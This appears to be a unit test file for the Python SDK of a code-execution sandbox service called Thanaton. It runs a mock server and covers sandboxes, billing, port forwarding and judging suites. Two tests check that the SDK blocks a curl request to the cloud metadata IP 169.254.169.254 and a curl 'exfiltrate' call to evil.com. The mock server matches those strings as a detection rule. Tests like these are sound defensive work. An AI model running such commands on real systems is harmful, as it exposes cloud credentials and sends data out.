"""Automated unit and integration tests for Thanaton Python SDK."""

import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import unittest
import sys
from pathlib import Path

# Insert local thanaton package into sys.path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import thanaton
from thanaton.exceptions import APIError, SandboxNotFoundError, ThanatonError


class MockThanatonHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass  # Suppress server access logs during tests

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length).decode("utf-8")) if length > 0 else {}

        if self.path == "/api/v1/billing/checkout":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "checkout_url": "https://checkout.stripe.com/c/pay/cs_test_mock",
                "session_id": "cs_test_mock",
                "plan": body.get("plan", "tier_pro"),
                "amount_cents": 4900
            }).encode("utf-8"))
            return

        if self.path == "/api/v1/billing/topup":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "success",
                "deposited_usd": body.get("amount_usd", 15.0),
                "new_balance_usd": 40.0
            }).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            resp = {
                "id": "sbx_py_test_1",
                "tenant_id": body.get("tenant_id", "default"),
                "runtime": body.get("runtime", "microvm"),
                "state": "running",
                "has_db": body.get("with_db", False),
                "db_url": "postgresql://postgres:thanaton@172.16.2.2:5432/sbx_py_test_1" if body.get("with_db") else None,
                "boot_duration_ms": 5.91,
                "created_at": "2026-11-01T12:00:00Z",
                "last_active_at": "2026-11-01T12:00:00Z"
            }
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        if "169.254.169.254" in body.get("command", ""):
            self.send_response(403)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "failed",
                "error": "SSRF_BLOCKED: prohibited AWS Link-Local Metadata IP (169.254.169.254)",
                "security_violation": True
            }).encode("utf-8"))
            return

        if body.get("egress_policy") == "locked" and "curl" in body.get("command", ""):
            self.send_response(403)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "failed",
                "error": "EGRESS_BLOCKED: sandbox egress policy is locked",
                "security_violation": True
            }).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/sbx_py_test_1/exec":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            resp = {
                "stdout": f"Captured: {body.get('command')}\n",
                "stderr": "",
                "exit_code": 0,
                "duration_ms": 11.2
            }
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        if self.path == "/_thanaton/tenants/sbx_py_test_1/sleep":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "sleeping"}).encode("utf-8"))
            return

        if self.path == "/_thanaton/tenants/sbx_py_test_1/wake":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "running"}).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/sbx_py_test_1/ports":
            self.send_response(201)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "sandbox_id": "sbx_py_test_1",
                "guest_port": body.get("guest_port", 5432),
                "host_port": 15432,
                "protocol": body.get("protocol", "tcp"),
                "service_name": body.get("service_name", "postgres"),
                "connection_string": "postgresql://postgres:thanaton@nephis.theeducode.com:15432/main"
            }).encode("utf-8"))
            return

        if self.path == "/v1/speculate/race":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "completed",
                "winner_id": "cand_2",
                "strategy": body.get("strategy", "FASTEST_PASSING"),
                "race_duration_ms": 38.5,
                "branches": [
                    {"id": "cand_1", "exit_code": 1, "duration_ms": 12.0, "reaped": True},
                    {"id": "cand_2", "exit_code": 0, "duration_ms": 38.5, "committed": True}
                ]
            }).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/wal/rewind":
            self.send_response(201)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "rewound",
                "branch_id": "br-test-wal-1",
                "source_lsn": body.get("target_lsn", "16/B374D848"),
                "db_url": "postgresql://postgres:thanaton@127.0.0.1:5432/br-test-wal-1"
            }).encode("utf-8"))
            return

        if self.path == "/v1/execute":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            suite = body.get("suite", "Omni")
            resp = {
                "Results": [{
                    "test_case_id": 1,
                    "time": 0.019,
                    "memory": 11800,
                    "stdout": "PASS",
                    "stderr": "",
                    "passed": True,
                    "status_id": 3,
                    "suite": suite,
                }],
                "Error": ""
            }
            if suite == "Complexity":
                resp["Results"][0]["instructions_executed"] = 18450
            elif suite == "Sanitizer":
                resp["Results"][0]["memory_leaks"] = False
            elif suite == "DBMS":
                resp["Results"][0]["schema_applied"] = True
            elif suite == "FileIO":
                resp["Results"][0]["file_matched"] = True
            elif suite == "SpecialJudge":
                resp["Results"][0]["checker_verdict"] = "ACCEPTED"
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        if self.path == "/api/v1/speculate":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            resp = {
                "success": True,
                "winner_id": "patch_2",
                "duration_ms": 1380.0,
                "total_candidates": len(body.get("candidates", [])),
                "pruned_in_memory": 1,
                "sandboxes_forked": 2,
                "db_clones_forked": 2,
                "branches": [
                    {"id": "patch_1", "status": "PRUNED_SYNTAX", "exit_code": 1, "duration_ms": 0.05},
                    {"id": "patch_2", "status": "PASSED", "exit_code": 0, "duration_ms": 1150.0},
                    {"id": "patch_3", "status": "FAILED", "exit_code": 1, "duration_ms": 1200.0}
                ]
            }
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        self.send_response(404)
        self.end_headers()

    def do_GET(self):
        if self.path == "/api/v1/billing/wallet":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "balance_usd": 25.00,
                "credits_balance": 125000,
                "tier": "pro",
                "max_memory_mb": 4096
            }).encode("utf-8"))
            return

        if self.path == "/api/v1/billing/invoices":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps([
                {"id": "inv_1", "amount_cents": 4900, "status": "paid"}
            ]).encode("utf-8"))
            return

        if self.path == "/api/v1/billing/plans":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps([
                {"id": "tier_pro", "price_usd": 49.0}
            ]).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/sbx_py_test_1/pty":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "ready",
                "sandbox_id": "sbx_py_test_1",
                "terminal": "xterm-256color",
                "cols": 120,
                "rows": 32,
                "wss_endpoint": "wss://nephis.theeducode.com/v1/sandboxes/sbx_py_test_1/pty"
            }).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/sbx_py_test_1/ports":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "sandbox_id": "sbx_py_test_1",
                "ports": [
                    {
                        "sandbox_id": "sbx_py_test_1",
                        "guest_port": 5432,
                        "host_port": 15432,
                        "protocol": "tcp",
                        "service_name": "postgres",
                        "connection_string": "postgresql://postgres:thanaton@nephis.theeducode.com:15432/main"
                    }
                ]
            }).encode("utf-8"))
            return

        if "/ports/" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "released"}).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/sbx_py_test_1":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            resp = {
                "id": "sbx_py_test_1",
                "tenant_id": "default",
                "runtime": "microvm",
                "state": "running",
                "has_db": False,
                "boot_duration_ms": 5.91,
                "created_at": "2026-11-01T12:00:00Z",
                "last_active_at": "2026-11-01T12:00:00Z"
            }
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        self.send_response(404)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"error": "not found"}).encode("utf-8"))

    def do_DELETE(self):
        if self.path == "/v1/sandboxes/sbx_py_test_1/pty":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "status": "ready",
                "sandbox_id": "sbx_py_test_1",
                "terminal": "xterm-256color",
                "cols": 120,
                "rows": 32,
                "wss_endpoint": "wss://nephis.theeducode.com/v1/sandboxes/sbx_py_test_1/pty"
            }).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/sbx_py_test_1/ports":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({
                "sandbox_id": "sbx_py_test_1",
                "ports": [
                    {
                        "sandbox_id": "sbx_py_test_1",
                        "guest_port": 5432,
                        "host_port": 15432,
                        "protocol": "tcp",
                        "service_name": "postgres",
                        "connection_string": "postgresql://postgres:thanaton@nephis.theeducode.com:15432/main"
                    }
                ]
            }).encode("utf-8"))
            return

        if "/ports/" in self.path:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "released"}).encode("utf-8"))
            return

        if self.path == "/v1/sandboxes/sbx_py_test_1":
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps({"status": "destroyed"}).encode("utf-8"))
            return
        self.send_response(404)
        self.end_headers()


class TestThanatonSDK(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.server = HTTPServer(("127.0.0.1", 0), MockThanatonHandler)
        cls.port = cls.server.server_port
        cls.server_thread = threading.Thread(target=cls.server.serve_forever, daemon=True)
        cls.server_thread.start()
        cls.client = thanaton.Client(base_url=f"http://127.0.0.1:{cls.port}", api_key="thanaton_sec_test")

    @classmethod
    def tearDownClass(cls):
        cls.server.shutdown()
        cls.server.server_close()

    def test_client_initialization(self):
        self.assertEqual(self.client.base_url, f"http://127.0.0.1:{self.port}")
        self.assertEqual(self.client.api_key, "thanaton_sec_test")

    def test_sandbox_provisioning(self):
        sbx = self.client.sandboxes.create(runtime="microvm", memory_mb=512, with_db=True)
        self.assertEqual(sbx.id, "sbx_py_test_1")
        self.assertEqual(sbx.runtime, "microvm")
        self.assertTrue(sbx.has_db)
        self.assertIn("postgresql://", sbx.db_url)
        self.assertEqual(sbx.state, "running")

    def test_sandbox_exec(self):
        sbx = self.client.sandboxes.get("sbx_py_test_1")
        res = sbx.exec("echo 'hello from python'")
        self.assertTrue(res.ok)
        self.assertEqual(res.exit_code, 0)
        self.assertIn("Captured: echo 'hello from python'", res.stdout)

    def test_sandbox_sleep_and_wake(self):
        sbx = self.client.sandboxes.get("sbx_py_test_1")
        sbx.sleep()
        self.assertEqual(sbx.state, "sleeping")
        sbx.wake()
        self.assertEqual(sbx.state, "running")

    def test_sandbox_destroy(self):
        sbx = self.client.sandboxes.get("sbx_py_test_1")
        sbx.destroy()
        self.assertEqual(sbx.state, "stopped")

    def test_exceptions_hierarchy(self):
        self.assertTrue(issubclass(APIError, ThanatonError))
        self.assertTrue(issubclass(SandboxNotFoundError, ThanatonError))

        with self.assertRaises(SandboxNotFoundError):
            self.client.sandboxes.get("sbx_non_existent")

    def test_connection_error_diagnostic(self):
        # Client targeting unreachable port
        unreachable_client = thanaton.Client(base_url="http://127.0.0.1:59999")
        with self.assertRaises(thanaton.ThanatonConnectionError) as ctx:
            unreachable_client.sandboxes.list()
        err_msg = str(ctx.exception)
        self.assertIn("Cannot connect to Thanaton Daemon", err_msg)
        self.assertIn("Launch the daemon with 'ananked'", err_msg)
        self.assertIn("Set base_url='https://api.ananke.run'", err_msg)

    def test_escalation_required_exception(self):
        exc = thanaton.EscalationRequiredException(
            capability="REQUIRES_FILESYSTEM",
            attempted="open('/etc/hosts')",
            reason="Filesystem access restricted in in-memory tier",
            serialized_state={"counter": 42, "user": "agent_alpha"}
        )
        self.assertEqual(exc.capability, "REQUIRES_FILESYSTEM")
        self.assertEqual(exc.attempted, "open('/etc/hosts')")
        self.assertEqual(exc.serialized_state["counter"], 42)
        self.assertIn("Upgrade to Thanaton MicroVM using", str(exc))

    def test_upgrade_to_thanaton_with_state_hydration(self):
        state = {"model_weights": "gpt2-tiny", "epoch": 3, "loss": 0.012}
        sbx = self.client.upgrade_to_thanaton(session_or_state=state, memory_mb=512)
        self.assertEqual(sbx.id, "sbx_py_test_1")
        self.assertEqual(sbx.state, "running")

    def test_speculate_physical_mcts(self):
        candidates = [
            {"id": "patch_1", "patch": "syntax error", "strategy": "syntax_error"},
            {"id": "patch_2", "patch": "atomic_cas_fix()", "strategy": "atomic"},
            {"id": "patch_3", "patch": "sleep(10)", "strategy": "timeout"}
        ]
        result = self.client.speculate(
            candidates=candidates,
            test_command="pytest tests/test_async.py",
            repo="django/django",
            strategy="FASTEST_PASSING"
        )
        self.assertTrue(result["success"])
        self.assertEqual(result["winner_id"], "patch_2")
        self.assertEqual(result["total_candidates"], 3)
        self.assertEqual(result["pruned_in_memory"], 1)
        self.assertEqual(len(result["branches"]), 3)

        # Also test standalone offline fallback
        offline_client = thanaton.Client(base_url="http://127.0.0.1:59998")
        offline_res = offline_client.speculate(
            candidates=[{"id": "cand_a", "patch": "while True: pass"}, {"id": "cand_b", "patch": "x = 1"}]
        )
        self.assertTrue(offline_res["success"])
        self.assertEqual(offline_res["winner_id"], "cand_b")
        self.assertEqual(offline_res["pruned_in_memory"], 1)

    def test_billing_manager(self):
        wallet = self.client.billing.get_wallet()
        self.assertEqual(wallet["tier"], "pro")
        self.assertEqual(wallet["balance_usd"], 25.00)

        topup = self.client.billing.topup(15.00)
        self.assertEqual(topup["status"], "success")

        checkout = self.client.billing.checkout("tier_pro")
        self.assertEqual(checkout["plan"], "tier_pro")
        self.assertEqual(checkout["session_id"], "cs_test_mock")

        invoices = self.client.billing.list_invoices()
        self.assertEqual(len(invoices), 1)
        self.assertEqual(invoices[0]["amount_cents"], 4900)

    def test_ssrf_metadata_violation(self):
        sbx = self.client.sandboxes.create(runtime="microvm")
        with self.assertRaises(thanaton.SSRFSecurityViolationError):
            sbx.exec("curl http://169.254.169.254/latest/meta-data/")

    def test_egress_locked_violation(self):
        sbx = self.client.sandboxes.create(runtime="microvm")
        with self.assertRaises(thanaton.EgressPolicyViolationError):
            sbx.exec("curl https://evil.com/exfiltrate", egress_policy="locked")

    def test_pty_terminal_metadata(self):
        sbx = self.client.sandboxes.create(runtime="microvm")
        pty = sbx.pty_info()
        self.assertEqual(pty["status"], "ready")
        self.assertEqual(pty["terminal"], "xterm-256color")
        self.assertTrue(pty["wss_endpoint"].startswith("wss://"))

    def test_l4_port_forwarding_lifecycle(self):
        sbx = self.client.sandboxes.create(runtime="microvm")
        exp = sbx.expose_port(5432, service_name="postgres")
        self.assertEqual(exp["guest_port"], 5432)
        self.assertEqual(exp["host_port"], 15432)
        self.assertTrue("postgresql://" in exp["connection_string"])

        ports = sbx.list_ports()
        self.assertEqual(len(ports), 1)
        self.assertEqual(ports[0]["host_port"], 15432)

        res = sbx.close_port(15432)
        self.assertEqual(res["status"], "released")

    def test_speculative_branch_race(self):
        candidates = [
            {"id": "cand_1", "patch": "syntax err", "command": "exit 1"},
            {"id": "cand_2", "patch": "clean fix", "command": "pytest"}
        ]
        res = self.client.race(candidates=candidates)
        self.assertEqual(res["status"], "completed")
        self.assertEqual(res["winner_id"], "cand_2")
        self.assertEqual(len(res["branches"]), 2)

    def test_wal_rewind_recovery(self):
        res = self.client.rewind_database(target_lsn="16/B374D848")
        self.assertEqual(res["status"], "rewound")
        self.assertEqual(res["branch_id"], "br-test-wal-1")
        self.assertTrue(res["db_url"].startswith("postgresql://"))

    def test_execute_suite(self):
        res = self.client.execute_suite(source_code="print(1)", language_id=71, suite="Omni")
        self.assertEqual(len(res["Results"]), 1)
        self.assertTrue(res["Results"][0]["passed"])
        self.assertEqual(res["Results"][0]["stdout"], "PASS")

    def test_complexity_profile(self):
        res = self.client.complexity_profile(source_code="int main(){}", language_id=202, stdin="100")
        self.assertEqual(len(res["Results"]), 1)
        self.assertEqual(res["Results"][0]["instructions_executed"], 18450)

    def test_sanitize_check(self):
        res = self.client.sanitize_check(source_code="int main(){}", language_id=202)
        self.assertEqual(len(res["Results"]), 1)
        self.assertFalse(res["Results"][0]["memory_leaks"])

    def test_dbms_eval(self):
        res = self.client.dbms_eval(source_code="SELECT 1;", schema_sql="CREATE TABLE t(x int);", database="sqlite")
        self.assertEqual(len(res["Results"]), 1)
        self.assertTrue(res["Results"][0]["schema_applied"])

    def test_fileio_eval(self):
        res = self.client.fileio_eval(source_code="pass", input_filename="in.txt", input_content="DATA", output_filename="out.txt")
        self.assertEqual(len(res["Results"]), 1)
        self.assertTrue(res["Results"][0]["file_matched"])

    def test_special_judge(self):
        res = self.client.special_judge(source_code="pass", checker_code="checker")
        self.assertEqual(len(res["Results"]), 1)
        self.assertEqual(res["Results"][0]["checker_verdict"], "ACCEPTED")

    def test_batch_execute(self):
        res = self.client.batch_execute(source_code="print(1)", tests=[{"stdin": "1", "expected_output": "1"}], suite="Omni")
        self.assertEqual(len(res["Results"]), 1)
        self.assertTrue(res["Results"][0]["passed"])


if __name__ == "__main__":
    unittest.main()
